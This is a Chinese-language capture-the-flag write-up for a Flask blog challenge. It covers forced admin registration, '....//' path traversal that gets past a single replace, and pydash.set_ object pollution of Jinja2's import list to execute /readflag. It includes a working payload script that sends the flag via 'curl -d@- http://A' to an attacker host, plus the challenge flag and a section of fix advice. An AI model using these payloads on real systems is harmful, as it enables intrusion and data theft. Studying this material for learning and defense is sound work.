# SU_blog

## 题目简述

题目是一个 Flask 博客，提供注册、登录、文章读取、友链管理和隐藏的 `/Admin` 接口。flag 位于只有 root 可读的 `/flag`，程序另行安装了 SUID root 的 `/readflag`。

完整利用链为：

1. 取得用户名为 `admin` 的会话；
2. 利用文章接口“先检查、后替换”的路径处理缺陷读取 `app.py` 和 `waf.py`；
3. 调用隐藏接口，把可控路径交给 `pydash.set_`；
4. 沿 Python 对象图污染 `jinja2.runtime.exported`；
5. 在下一次模板编译时注入 Python 语句，执行 `/readflag`。

官方题解中的 10 张截图分别展示了页面提示、Cookie、文件读取和反弹 shell。它们没有包含无法转写的视觉信息，下面改用源码、请求和回显条件完整描述。

## 解题过程

### 1. 取得管理员会话

页面页脚提示：

```text
我最喜欢时间戳了，而且听说 md5 这种单项签名非常安全，
所以我把博客诞生的时间当做了自己的 SECRET
```

源码确实在进程启动时用当前 Unix 时间戳生成 Flask Session 密钥：

```python
app.config["SECRET_KEY"] = hashlib.md5(
    str(int(time.time())).encode()
).hexdigest()
```

因此，如果能估计服务启动时间，可以枚举时间戳的 MD5，再用恢复出的密钥签发：

```python
{"username": "admin"}
```

不过源码中存在更短、也更稳定的办法。注册接口既不禁止用户名 `admin`，也不检查重名：

```python
@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        users[username] = password
        return redirect(url_for("login"))
```

初始用户表只有：

```python
users = {"testuser": "password"}
```

所以直接注册 `admin`，再用相同密码登录即可。服务端授权只比较 Session 中的用户名：

```python
session.get("username") == "admin"
```

这条路径不依赖时间窗口，也不需要伪造签名。

### 2. 利用一次替换完成路径穿越

文章接口对输入的处理顺序如下：

```python
file_name = request.args.get("file", "")

blacklist = ["waf.py"]
if any(item in file_name for item in blacklist):
    return "大黑阔不许看"

if not file_name.startswith("articles/"):
    return "无效的文件路径。"

if file_name not in articles.values():
    if session.get("username") != "admin":
        return "无权访问该文件。"

file_path = os.path.join(BASE_DIR, file_name)
file_path = file_path.replace("../", "")

with open(file_path, "r", encoding="utf-8") as f:
    content = f.read()
```

缺陷有两点：

- 权限和黑名单检查针对原始字符串；
- `replace("../", "")` 只执行一次，处理后没有再做规范化与根目录约束。

例如：

```text
....//
```

经过一次 `replace("../", "")` 后会重新形成：

```text
../
```

管理员可以用下面的参数读取应用源码：

```text
/article?file=articles/....//app.py
```

处理后的文件名是：

```text
articles/../app.py
```

要读取被黑名单禁止的 `waf.py`，再把文件名本身拆开：

```text
/article?file=articles/....//wa../f.py
```

原始字符串不含连续的 `waf.py`；一次替换后却得到：

```text
articles/../waf.py
```

由此可获得 `/Admin` 接口、硬编码参数 `pass=SUers` 以及两组黑名单。

### 3. 分析 `pydash.set_` 的对象图写入

隐藏接口的核心代码为：

```python
@app.route("/Admin", methods=["GET", "POST"])
def admin():
    if request.args.get("pass") != "SUers":
        return "nonono"

    body = request.json
    key = body.get("key")
    value = body.get("value")

    if not pwaf(key) or not cwaf(value):
        return "Invalid", 400

    set_(user_data, key, value)
    return jsonify({"message": "User data updated successfully"})
```

`user_data` 是普通 Python 对象：

```python
class User:
    def __init__(self):
        pass

user_data = User()
```

`pydash==5.1.2` 的 `set_` 会把点分路径逐段交给属性或下标访问。路径不局限于实例自己的业务字段，所以可从 `__init__.__globals__` 进入模块全局对象，再继续沿模块、类和列表移动。这类问题是 Python 对象/类属性污染，不是 JavaScript 的原型链污染。

`key` 黑名单禁止了 `__loader__`、`os`、`path`、`app`、多数数字等字符串，但没有禁止 `__spec__`、`sys`、`modules` 和数字 `2`。可用以下对象路径绕过：

```text
__init__.__globals__.json.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2
```

各段含义为：

1. 从 `User.__init__.__globals__` 进入 `app.py` 的全局命名空间；
2. 取得已经导入的 `json` 模块；
3. 经 `json.__spec__.__init__.__globals__` 到达导入系统函数的全局字典；
4. 从其中取得 `sys.modules`；
5. 定位已加载的 `jinja2.runtime`；
6. 覆盖 `exported` 列表的第 2 项。

### 4. 污染 Jinja2 导入列表并执行命令

Jinja2 编译模板时，会把 `jinja2.runtime.exported` 排序并拼入生成代码的导入行。把某个元素替换为以下形式：

```python
*;import os;os.system("command");#
```

由于字符串以 `*` 开头，排序后它会位于最前。最终生成的 Python 源码形如：

```python
from jinja2.runtime import *;import os;os.system("command");#, LoopContext, ...
```

分号结束合法的星号导入，后面的 `#` 注释掉剩余名称，于是中间语句会在模板代码加载时执行。

`value` 还受到长度不超过 77 字符以及 `flag`、`readflag`、`cat`、`base64` 等子串黑名单限制。Python 相邻字符串字面量会在解析期自动拼接，所以可把敏感词拆成：

```python
"/read" "f" "lag"
```

示例请求如下，其中 `http://A` 应替换为自己控制的接收端：

```python
import requests

target = "http://challenge/Admin?pass=SUers"

payload = {
    "key": (
        "__init__.__globals__.json.__spec__.__init__.__globals__."
        "sys.modules.jinja2.runtime.exported.2"
    ),
    "value": "*;import os;os.system('/read''f''lag|curl -d@- http://A');#",
}

response = requests.post(target, json=payload, timeout=5)
print(response.text)
```

污染成功后，再访问任意会触发 Jinja2 模板编译的页面。`/readflag` 以 SUID root 权限读取 `/flag`，其输出被 `curl` 作为请求体发送到接收端。

仓库中的 `generate_flag.sh` 给出了静态 flag：

```text
SUCTF{fl4sk_1s_5imp1e_bu7_pyd45h_1s_n0t_s0_I_l0v3}
```

### 5. 修复思路

仅仅调整 `replace` 的先后顺序并不能可靠修复路径穿越。正确做法是：

1. 将用户路径与允许目录拼接后调用 `Path.resolve()`；
2. 验证解析结果仍位于固定文章根目录内；
3. 最好只接受服务端维护的文章 ID，不直接接受文件路径；
4. 禁止普通注册覆盖保留用户名，并在服务端保存角色；
5. 删除硬编码隐藏接口；
6. 不允许 `pydash.set_` 等通用深层写入函数处理用户提供的属性路径，只对白名单业务字段赋值。

## 方法总结

本题同时包含弱 Session 密钥、越权注册、路径穿越和 Python 对象图污染。最短稳定路线不是机械爆破时间戳，而是先根据源码判断真正的授权字段，直接注册 `admin`；随后用双写绕过一次性路径替换，读取隐藏接口和 WAF；最后利用 `pydash.set_` 把写入能力推进到 Jinja2 的模板编译阶段。

处理这类多段 Web 链时，应逐层记录“检查时看到的输入”和“最终消费者看到的输入”。本题中，文章接口的黑名单、`replace` 后的路径、`pydash` 的对象路径解析，以及 Jinja2 生成的 Python 导入行，分别形成了四种不同的输入语义；利用正是建立在这些视图不一致之上。
